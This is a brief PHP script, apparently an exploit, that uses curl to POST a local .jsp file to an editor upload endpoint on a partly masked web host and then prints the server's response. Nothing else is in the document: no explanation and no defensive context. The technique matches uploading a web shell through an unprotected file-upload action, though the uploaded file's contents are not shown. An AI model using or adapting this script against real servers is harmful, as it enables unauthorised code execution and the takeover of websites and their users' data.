<?php

$url='http://card.xxx.com/pages/xxfb/editor/uploadAction.action';

$file = array(

		'file'=>"@D:\\123.jsp"

	);

$ch=curl_init();

curl_setopt($ch, CURLOPT_URL, $url);

curl_setopt($ch, CURLOPT_HEADER, false);

curl_setopt($ch,CURLOPT_BINARYTRANSFER,true);

curl_setopt($ch, CURLOPT_POST, 1);

@curl_setopt($ch, CURLOPT_POSTFIELDS, $file);

curl_setopt($ch, CURLOPT_HEADER, 1);

curl_setopt($ch, CURLOPT_NOBODY, 0);

curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);

curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1);

$content=curl_exec($ch);

$rinfo=curl_getinfo($ch);

@$content=iconv("GB2312","UTF-8",htmlentities($content,ENT_COMPAT,'GB2312'));

echo $content."<br><br><br>";
?>